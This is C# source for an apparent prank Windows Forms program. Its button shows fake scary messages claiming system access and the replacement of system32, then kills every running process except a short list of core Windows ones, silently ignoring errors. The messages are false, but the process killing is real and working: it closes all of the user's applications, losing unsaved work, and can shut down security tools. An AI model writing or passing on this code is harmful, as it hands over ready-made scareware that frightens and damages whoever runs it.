using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace App
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Show messages to the user
            MessageBox.Show("Gaining access");
            MessageBox.Show("System : replacing system32 with susy32");
            MessageBox.Show("System : replacing winwow64 with supersus64");
            MessageBox.Show("Your PC will crash when you click the OK button so it can turn your PC to supersusPC");

            // Kill non-essential processes
            Process[] processes = Process.GetProcesses(); // Get all processes in your system

            for (int i = 0; i < processes.Length; i++)
            {
                Process process = processes[i];
                try
                {
                    // Skip critical system processes to avoid system instability
                    if (process.ProcessName != "explorer" && process.ProcessName != "winlogon" && process.ProcessName != "csrss" && process.ProcessName != "services" && process.ProcessName != "lsass" && process.ProcessName != "System" && process.ProcessName != "Idle")
                    {
                        process.Kill(); // Kill the process
                    }
                }
                catch (Exception)
                {
                    // Silently catch exceptions to avoid crashing the program
                }
            }
        }
    }
}
